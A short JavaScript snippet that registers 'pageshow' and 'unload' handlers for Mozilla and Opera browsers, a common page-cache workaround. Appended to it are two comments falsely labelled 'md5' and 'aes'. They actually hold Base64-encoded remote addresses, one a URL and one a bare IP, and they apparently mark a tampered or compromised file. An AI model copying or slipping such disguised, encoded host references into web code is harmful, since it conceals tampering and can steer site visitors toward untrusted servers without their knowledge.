if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly84Ljg0MDExMDExMy5jb20vaW5kZXgvaW5kZXgvaGVsbG8uaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/